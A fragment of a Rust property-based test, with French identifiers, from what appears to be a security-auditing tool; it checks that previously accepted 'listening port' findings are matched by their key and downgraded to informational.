            let mut a = Appris::default();
            for (p, r) in &acceptes {
                a.acceptees.insert(
                    format!("{}|{}", regles[usize::from(*r)], p),
                    Acceptee {
                        categorie: "Ports en écoute".into(),
                        message: message(*p),
                        niveau: Niveau::Eleve,
                        le: "2026-10-22".into(),
                        cle: Some(format!("{}|port:{p}/tcp", regles[usize::from(*r)])),
                        etat: None,
                        lignes: Vec::new(),
                        traces: Vec::new(),
                    },
                );
            }
            let mut c: Vec<Constat> = alertes
                .iter()
                .map(|(p, r, migre)| {
                    let mut x = constat("Ports en écoute", Niveau::Moyen, &message(*p));
                    x.regle = regles[usize::from(*r)];
                    if *migre {
                        x.objet = crate::modele::Objet::port(*p, "tcp", None);
                    }
                    x
                })
                .collect();
            appliquer_le(&a, &mut c, jour("2026-10-23"));
            for (x, (p, r, migre)) in c.iter().zip(&alertes) {
                let touche = x.probleme == Some(Niveau::Info);
                let par_cle = *migre && acceptes.contains(&(*p, *r));
                // Sans clé, le texte ne retrouve qu'un choix sans clé : ici tous en ont une, donc jamais.
                prop_assert_eq!(touche, par_cle, "{} {} {}", p, r, migre);
            }
        }
    }
}
